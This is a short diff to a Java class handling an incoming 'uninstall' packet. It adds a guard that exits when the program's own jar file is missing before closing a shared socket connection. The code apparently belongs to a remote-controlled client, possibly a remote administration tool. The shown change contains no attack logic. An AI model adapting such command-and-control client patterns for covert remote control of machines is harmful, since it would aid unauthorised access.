@@ -16,6 +16,10 @@ public class Packet36Uninstall extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		File me = Utils.getJarFile();
+		
+		if (!me.isFile()) {
+			return;
+		}
 
 		try {
 			Connection.socket.close();
